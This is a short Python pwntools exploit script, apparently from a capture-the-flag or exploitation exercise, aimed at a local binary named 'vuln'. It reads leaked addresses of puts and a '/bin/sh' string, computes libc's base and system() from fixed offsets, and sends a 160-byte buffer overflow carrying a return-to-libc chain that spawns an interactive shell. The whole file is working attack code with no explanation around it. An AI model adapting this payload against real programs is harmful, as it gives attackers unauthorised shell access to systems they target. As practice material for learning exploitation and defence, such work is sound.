#!/usr/bin/env python

import re
from pwn import *

r = process("./vuln")
data = r.recvuntil("Enter a string:\n")

puts = int(re.search("puts: (0x[0-9a-f]+)\n", data).group(1), 16)
base = puts - 0x5fca0
system = base + 0x3ada0

# base = puts - 0x5f140
# system = base + 0x3a940

binsh = int(re.search("useful_string: (0x[0-9a-f]+)\n", data).group(1), 16)

print("Base", hex(base))
print("System", hex(system))
print("/bin/sh", hex(binsh))

payload = (
    "A" * 160 +
    p32(system) +
    "BBBB" +
    p32(binsh)
)
r.sendline(payload)
r.interactive()
